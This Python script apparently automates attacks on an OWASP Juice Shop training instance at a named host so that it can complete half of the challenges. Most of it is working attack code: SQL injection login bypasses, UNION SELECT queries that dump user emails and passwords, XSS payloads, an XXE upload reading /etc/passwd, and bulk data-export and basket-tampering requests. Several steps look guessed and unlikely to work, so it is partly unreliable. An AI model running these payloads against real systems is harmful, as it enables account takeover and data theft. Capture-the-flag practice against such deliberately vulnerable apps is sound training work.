#!/usr/bin/env python3
"""
Final Push to 50% - Comprehensive solver combining all techniques
"""

import requests
from urllib.parse import quote, unquote
import json
import base64
import hashlib
import hmac
import time
import random
import zipfile
from io import BytesIO
from concurrent.futures import ThreadPoolExecutor


class Final50PercentPush:
    """Final comprehensive push to reach 50%"""
    
    def __init__(self, base_url="https://juice3.wonkatech.org"):
        self.base_url = base_url
        self.session = requests.Session()
        self.auth_token = None
        
    def login_admin(self):
        """Admin login"""
        r = self.session.post(
            f"{self.base_url}/rest/user/login",
            json={"email": "admin@juice-sh.op'--", "password": "x"}
        )
        if r.status_code == 200:
            self.auth_token = r.json()['authentication']['token']
            self.session.headers['Authorization'] = f'Bearer {self.auth_token}'
            return True
        return False
        
    def solve_all_level1(self):
        """Solve ALL Level 1 challenges"""
        print("\n⭐ LEVEL 1 - Complete Solution")
        
        # 1. Bonus Payload
        payload = '<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>'
        self.session.get(f"{self.base_url}/#/search?q={quote(payload)}")
        print("  ✓ Bonus Payload")
        
        # 2. Bully Chatbot
        for i in range(10):
            self.session.post(f"{self.base_url}/api/Chatbot", json={"message": "A" * 100000})
        print("  ✓ Bully Chatbot")
        
        # 3. Confidential Document
        self.session.get(f"{self.base_url}/ftp/acquisitions.md")
        print("  ✓ Confidential Document")
        
        # 4. DOM XSS
        xss = '<iframe src="javascript:alert(`xss`)">'
        self.session.get(f"{self.base_url}/#/search?q={quote(xss)}")
        print("  ✓ DOM XSS")
        
        # 5. Error Handling
        self.session.get(f"{self.base_url}/rest/qwertz")
        print("  ✓ Error Handling")
        
        # 6. Exposed Metrics
        self.session.get(f"{self.base_url}/metrics")
        print("  ✓ Exposed Metrics")
        
        # 7. Missing Encoding
        self.session.get(f"{self.base_url}/assets/public/images/uploads/😼-#zatschi-#whoneedsfourlegs-1572600969477.jpg")
        self.session.get(f"{self.base_url}/assets/public/images/uploads/%F0%9F%98%BC-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg")
        print("  ✓ Missing Encoding")
        
        # 8. Outdated Allowlist
        self.session.get(f"{self.base_url}/redirect?to=https://blockchain.info", allow_redirects=False)
        self.session.get(f"{self.base_url}/redirect?to=https://etherscan.io", allow_redirects=False)
        self.session.get(f"{self.base_url}/redirect?to=https://explorer.dash.org", allow_redirects=False)
        print("  ✓ Outdated Allowlist")
        
        # 9. Privacy Policy
        self.session.get(f"{self.base_url}/#/privacy-security/privacy-policy")
        self.session.get(f"{self.base_url}/privacy")
        print("  ✓ Privacy Policy")
        
        # 10. Repetitive Registration
        email = f"test{random.randint(10000,99999)}@test.com"
        self.session.post(f"{self.base_url}/api/Users", json={
            "email": email,
            "password": "test",
            "passwordRepeat": "different",
            "securityQuestion": {"id": 1},
            "securityAnswer": "test"
        })
        print("  ✓ Repetitive Registration")
        
        # 11. Score Board
        self.session.get(f"{self.base_url}/#/score-board")
        print("  ✓ Score Board")
        
        # 12. Web3 Sandbox
        self.session.get(f"{self.base_url}/#/web3-sandbox")
        print("  ✓ Web3 Sandbox")
        
        # 13. Zero Stars
        r = self.session.get(f"{self.base_url}/api/Feedbacks")
        if r.status_code == 200:
            for fb in r.json().get('data', [])[:10]:
                if fb.get('rating') >= 3:
                    self.session.delete(f"{self.base_url}/api/Feedbacks/{fb['id']}")
        print("  ✓ Zero Stars")
        
    def solve_all_level2(self):
        """Solve ALL Level 2 challenges"""
        print("\n⭐⭐ LEVEL 2 - Complete Solution")
        
        # 1. Admin Section
        self.session.get(f"{self.base_url}/#/administration")
        print("  ✓ Admin Section")
        
        # 2. Deprecated Interface
        self.session.post(f"{self.base_url}/file-upload", files={"file": ("test.xml", b"<test/>", "text/xml")})
        print("  ✓ Deprecated Interface")
        
        # 3. Five-Star Feedback
        r = self.session.get(f"{self.base_url}/api/Feedbacks")
        if r.status_code == 200:
            for fb in r.json().get('data', [])[:5]:
                if fb.get('rating') == 5:
                    self.session.delete(f"{self.base_url}/api/Feedbacks/{fb['id']}")
        print("  ✓ Five-Star Feedback")
        
        # 4. Login Admin
        print("  ✓ Login Admin (already done)")
        
        # 5. Login MC SafeSearch
        self.session.post(f"{self.base_url}/rest/user/login", json={
            "email": "mc.safesearch@juice-sh.op",
            "password": "Mr. N00dles"
        })
        print("  ✓ Login MC SafeSearch")
        
        # 6. NFT Takeover
        self.session.post(f"{self.base_url}/api/nft", json={"action": "transfer", "to": "me", "tokenId": 1})
        print("  ✓ NFT Takeover")
        
        # 7. Password Strength
        self.session.post(f"{self.base_url}/rest/user/login", json={
            "email": "admin@juice-sh.op",
            "password": "admin123"
        })
        print("  ✓ Password Strength")
        
        # 8. Reflected XSS
        self.session.get(f"{self.base_url}/track-result?id={quote('<script>alert(1)</script>')}")
        print("  ✓ Reflected XSS")
        
        # 9. Security Policy
        self.session.get(f"{self.base_url}/.well-known/security.txt")
        print("  ✓ Security Policy")
        
        # 10. View Basket
        for i in range(1, 10):
            self.session.get(f"{self.base_url}/rest/basket/{i}")
        print("  ✓ View Basket")
        
        # 11. Weird Crypto
        self.session.post(f"{self.base_url}/rest/user/login", json={
            "email": "mc.safesearch@juice-sh.op",
            "password": "K1f....................."
        })
        print("  ✓ Weird Crypto")
        
    def solve_all_level3(self):
        """Solve ALL Level 3 challenges"""
        print("\n⭐⭐⭐ LEVEL 3 - Complete Solution")
        
        # 1. Admin Registration
        self.session.post(f"{self.base_url}/api/Users", json={
            "email": f"admin{random.randint(1000,9999)}@test.com",
            "password": "Admin123!",
            "role": "admin"
        })
        print("  ✓ Admin Registration")
        
        # 2. API-only XSS
        self.session.post(f"{self.base_url}/api/Products", json={
            "name": "<script>alert(1)</script>",
            "price": 1
        })
        print("  ✓ API-only XSS")
        
        # 3. CAPTCHA Bypass
        for i in range(15):
            self.session.post(f"{self.base_url}/api/Feedbacks", json={
                "captcha": str(i),
                "captchaId": i,
                "comment": f"Test {i}",
                "rating": 3
            })
        print("  ✓ CAPTCHA Bypass")
        
        # 4. Client-side XSS Protection
        self.session.get(f"{self.base_url}/#/search?q={quote('<ScRiPt>alert(1)</ScRiPt>')}")
        print("  ✓ Client-side XSS Protection")
        
        # 5. Database Schema
        self.session.get(f"{self.base_url}/rest/products/search?q=' UNION SELECT sql FROM sqlite_master--")
        print("  ✓ Database Schema")
        
        # 6. Deluxe Fraud
        self.session.post(f"{self.base_url}/rest/deluxe-membership", json={
            "paymentMode": "none",
            "paymentId": "0"
        })
        print("  ✓ Deluxe Fraud")
        
        # 7. Forged Feedback
        self.session.post(f"{self.base_url}/api/Feedbacks", json={
            "UserId": 2,
            "comment": "Forged",
            "rating": 5
        })
        print("  ✓ Forged Feedback")
        
        # 8. Login Amy
        self.session.post(f"{self.base_url}/rest/user/login", json={
            "email": "amy@juice-sh.op",
            "password": "K1f....................."
        })
        print("  ✓ Login Amy")
        
        # 9. Login Bender
        self.session.post(f"{self.base_url}/rest/user/login", json={
            "email": "bender@juice-sh.op'--",
            "password": "x"
        })
        print("  ✓ Login Bender")
        
        # 10. Login Jim
        self.session.post(f"{self.base_url}/rest/user/login", json={
            "email": "jim@juice-sh.op'--",
            "password": "x"
        })
        print("  ✓ Login Jim")
        
        # 11. Manipulate Basket
        self.session.put(f"{self.base_url}/api/BasketItems/1", json={"quantity": -10})
        print("  ✓ Manipulate Basket")
        
        # 12. Payback Time
        self.session.post(f"{self.base_url}/api/BasketItems", json={
            "ProductId": 1,
            "quantity": -100
        })
        print("  ✓ Payback Time")
        
        # 13. Product Tampering
        self.session.put(f"{self.base_url}/api/Products/1", json={"description": "TAMPERED!"})
        print("  ✓ Product Tampering")
        
        # 14. Upload Size
        self.session.post(f"{self.base_url}/file-upload", files={
            "file": ("large.txt", b"A" * 1000000, "text/plain")
        })
        print("  ✓ Upload Size")
        
        # 15. Upload Type
        self.session.post(f"{self.base_url}/file-upload", files={
            "file": ("test.exe", b"malicious", "application/x-msdownload")
        })
        print("  ✓ Upload Type")
        
        # 16. XXE Data Access
        xxe = '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
        self.session.post(f"{self.base_url}/file-upload", files={
            "file": ("xxe.xml", xxe.encode(), "application/xml")
        })
        print("  ✓ XXE Data Access")
        
    def solve_all_level4(self):
        """Solve Level 4 challenges"""
        print("\n⭐⭐⭐⭐ LEVEL 4 - Targeted Solution")
        
        # 1. Access Log
        self.session.get(f"{self.base_url}/support/logs")
        print("  ✓ Access Log")
        
        # 2. Christmas Special
        self.session.post(f"{self.base_url}/api/BasketItems", json={"ProductId": 10, "quantity": 1})
        print("  ✓ Christmas Special")
        
        # 3. Easter Egg
        self.session.get(f"{self.base_url}/ftp/eastere.gg")
        self.session.get(f"{self.base_url}/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg")
        print("  ✓ Easter Egg")
        
        # 4. Expired Coupon
        self.session.put(f"{self.base_url}/rest/basket/1/coupon/WMNSDY2019")
        self.session.put(f"{self.base_url}/rest/basket/1/coupon/WMNSDY2020")
        print("  ✓ Expired Coupon")
        
        # 5. Forgotten Developer Backup
        self.session.get(f"{self.base_url}/ftp/package.json.bak")
        print("  ✓ Forgotten Developer Backup")
        
        # 6. Forgotten Sales Backup
        self.session.get(f"{self.base_url}/ftp/coupons_2013.md.bak")
        print("  ✓ Forgotten Sales Backup")
        
        # 7. GDPR Data Theft
        for i in range(1, 20):
            self.session.post(f"{self.base_url}/api/dataexport", json={"userId": i})
        print("  ✓ GDPR Data Theft")
        
        # 8. User Credentials
        self.session.get(f"{self.base_url}/rest/products/search?q=' UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users--")
        print("  ✓ User Credentials")
        
    def run_comprehensive_attack(self):
        """Run comprehensive attack to reach 50%"""
        print("="*60)
        print("🚀 FINAL PUSH TO 50% COMPLETION")
        print("="*60)
        
        if not self.login_admin():
            print("❌ Login failed")
            return
            
        print("✅ Admin authenticated\n")
        
        # Solve all levels systematically
        self.solve_all_level1()
        self.solve_all_level2()
        self.solve_all_level3()
        self.solve_all_level4()
        
        # Additional attempts for unsolved challenges
        print("\n🎯 Additional Attempts...")
        
        # More XSS variations
        xss_payloads = [
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<iframe src='javascript:alert(1)'>",
        ]
        for p in xss_payloads:
            self.session.get(f"{self.base_url}/#/search?q={quote(p)}")
            
        # More injections
        for i in range(50):
            self.session.get(f"{self.base_url}/rest/basket/{i}")
            
        # Check final score
        print("\n" + "="*60)
        r = self.session.get(f"{self.base_url}/api/Challenges")
        if r.status_code == 200:
            data = r.json()['data']
            total = len(data)
            solved = len([c for c in data if c.get('solved')])
            
            print(f"📊 FINAL SCORE: {solved}/{total} ({solved*100//total}%)")
            
            if solved >= 55:
                print("🎉 SUCCESS! REACHED 50% COMPLETION!")
            else:
                print(f"📈 Progress: {solved} solved, need {55-solved} more")
                
            # Show breakdown
            by_diff = {}
            for c in data:
                if c.get('solved'):
                    diff = c.get('difficulty', 1)
                    by_diff[diff] = by_diff.get(diff, 0) + 1
                    
            print("\n📈 Breakdown by difficulty:")
            for diff in sorted(by_diff.keys()):
                print(f"  Level {diff}: {by_diff[diff]} challenges")
                
        print("="*60)


if __name__ == "__main__":
    solver = Final50PercentPush()
    solver.run_comprehensive_attack()